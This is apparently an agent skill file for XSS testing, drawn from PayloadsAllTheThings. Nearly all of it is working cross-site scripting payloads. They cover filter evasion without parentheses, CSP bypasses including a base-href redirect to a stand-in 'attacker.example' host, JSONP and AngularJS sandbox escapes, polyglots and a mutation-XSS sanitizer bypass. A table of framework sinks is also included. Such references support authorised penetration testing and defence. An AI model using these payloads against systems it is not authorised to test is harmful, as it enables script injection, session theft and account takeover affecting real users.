---
description: Filter evasion without parentheses or alert, CSP bypass gadgets, framework sinks, polyglots, mutation XSS
skill: xss-testing
source: PayloadsAllTheThings — XSS Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# XSS Payloads

> Source: PayloadsAllTheThings — XSS Injection

## Filter Bypass Techniques

### Tag Alternatives

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

### Without Parentheses or `alert`

Many WAF rules key on `(`/`)` in handler values or on the word `alert`:

```html
<img src=x onerror=alert`1`>
<img src=x onerror="window.onerror=alert;throw 1">
<img src=x onerror="location='javascript:alert%281%29'">
<svg onload="import('data:text/javascript,alert(1)')">
```

```javascript
window['al'+'ert'](1)
print()                          // opens the print dialog: proves execution without alert
[].constructor.constructor('alert(1)')()
```

## CSP Bypass

```html
<!-- base-uri not set -->
<base href="https://attacker.example/">

<!-- script-src with unsafe-eval -->
<script>eval('al'+'ert(1)')</script>

<!-- data: URI allowed -->
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

<!-- JSONP endpoint on whitelisted domain -->
<script src="https://whitelisted.com/jsonp?callback=alert(1)//"></script>
<!-- e.g. script-src allows accounts.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Trusted Types bypass via default policy -->
<!-- Angular: template injection if ng-app present -->
{{constructor.constructor('alert(1)')()}}

<!-- AngularJS 1.x sandbox escape (some payload works for every 1.x version; pick by version) -->
{{$on.constructor('alert(1)')()}}

<!-- script-src allows a CDN that hosts angular.js: load it and use CSP-compatible mode.
     AngularJS evaluates expressions itself, so no unsafe-eval is needed. -->
<script src="https://<allowed-cdn>/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

Also check: `Content-Security-Policy-Report-Only` does not enforce; with no `script-src` the
policy falls back to `default-src`, and with neither there is no script restriction; `unsafe-eval`
present often means AngularJS is in use.

## Framework Sinks (escape hatches)

| Framework | Sink | Note |
|-----------|------|------|
| React | `dangerouslySetInnerHTML`, `ref.current.innerHTML`, `href={userUrl}` with `javascript:` | Older React only warns on `javascript:` URLs; confirm the version. |
| Angular | `bypassSecurityTrustHtml/Url/ResourceUrl` then `[innerHTML]`/`[src]` binding | `[innerHTML]` is sanitised unless the bypass is applied first; SSR template compilation of user input (`{{constructor.constructor('alert(1)')()}}`) is rare but critical. |
| AngularJS 1.x | any `{{ }}` interpolation of user input | Sandbox escapes exist for every version (above). |
| Vue | `v-html`, runtime template compile (`new Vue({template: userInput})`) | |
| jQuery | `.html()`, `.append()`, `$(userInput)` | `$()` parses HTML when the string starts with `<`. |
| Markdown | renderers with raw HTML enabled (`rehypeRaw`, `html: true`) | |
| Next.js / Nuxt | SSR hydration from a different source than the server render (`getServerSideProps` vs `useSearchParams`; Nuxt `asyncData`/`useFetch`) | |
| postMessage | handlers that write `event.data` to a sink without checking `event.origin` | |

## Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```html
-->'"/></sCript><deTailS open x oNToggle=(co\u006efirm)``>
```

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Mutation XSS (sanitizer bypass)

Namespace confusion between HTML, MathML and SVG makes the sanitizer's parse differ from the
browser's re-parse; the DOMPurify-class bypass shape:

```html
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
```

Try it against server-side or outdated client-side sanitizers; current DOMPurify releases patch
the known chains, so a hit usually means an old version or a custom sanitizer.
